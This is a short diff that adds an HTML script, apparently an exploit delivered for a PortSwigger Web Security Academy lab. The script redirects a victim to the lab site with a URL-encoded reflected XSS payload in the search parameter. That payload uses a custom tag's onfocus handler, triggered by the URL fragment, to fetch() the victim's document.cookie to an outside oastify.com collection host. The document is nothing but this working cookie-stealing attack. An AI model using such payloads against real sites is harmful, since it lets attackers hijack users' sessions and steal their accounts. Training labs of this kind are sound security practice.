@@ -1,0 +1,3 @@
+<script>
+location = 'https://0af200c0044639bf8236ecfd00e70038.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dfetch%28%27https%3A%2F%2F6hoas7fbrtpkmp7lhe4vkrv26tck0fo4.oastify.com%2F%3Fcookie%3D%27%2Bdocument.cookie%29%3E#x';
+</script>
